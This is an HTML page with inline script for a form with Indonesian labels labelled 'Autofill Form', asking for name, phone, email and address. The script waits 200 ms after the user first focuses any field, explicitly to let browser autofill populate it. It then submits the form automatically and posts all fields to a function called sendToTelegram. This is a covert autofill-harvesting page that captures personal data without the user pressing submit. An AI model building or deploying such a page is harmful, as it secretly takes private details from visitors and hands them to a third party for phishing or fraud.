<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Autofill Form</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <h2>Autofill Form</h2>
    <form id="autofillForm">
      <input type="text" name="name" placeholder="Nama" autocomplete="name" required />
      <input type="tel" name="phone" placeholder="Nomor HP" autocomplete="tel" required />
      <input type="email" name="email" placeholder="Email" autocomplete="email" required />
      <input type="text" name="address" placeholder="Alamat" autocomplete="street-address" />
      <button type="submit">Kirim</button>
    </form>
    <p id="status"></p>
  </div>

  <script>
    const form = document.getElementById("autofillForm");
    const status = document.getElementById("status");

    form.addEventListener("focusin", () => {
      setTimeout(() => {
        form.requestSubmit();
      }, 200); // memberi waktu autofill muncul dulu
    }, { once: true });

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      status.textContent = "Mengirim...";

      const formData = new FormData(form);
      const data = Object.fromEntries(formData.entries());

      try {
        const res = await fetch("/.netlify/functions/sendToTelegram", {
          method: "POST",
          body: JSON.stringify(data),
        });

        if (res.ok) {
          status.textContent = "Terkirim ke Telegram ✅";
          form.reset();
        } else {
          status.textContent = "Gagal mengirim ❌";
        }
      } catch (err) {
        status.textContent = "Terjadi error ❌";
      }
    });
  </script>
</body>
</html>
